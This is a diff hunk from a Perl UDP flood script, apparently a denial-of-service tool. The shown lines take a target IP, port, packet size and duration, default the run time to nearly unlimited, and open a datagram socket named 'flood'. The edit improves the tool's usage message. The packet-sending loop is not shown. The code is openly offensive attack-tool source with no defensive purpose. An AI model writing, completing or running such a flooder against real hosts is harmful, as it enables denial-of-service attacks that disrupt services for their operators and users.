@@ -9,7 +9,7 @@ my ($ip,$port,$size,$time) = @ARGV;
 
 my ($iaddr,$endtime,$psize,$pport);
 
-$iaddr = inet_aton("$ip") or die "Failed to slam, Or Incorect Usage $ip\n";
+$iaddr = inet_aton("$ip") or die "Failed to slam $ip\nUsage: <IP> <PORT> <SIZE> <TIME>\n";
 $endtime = time() + ($time ? $time : 9999999999);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
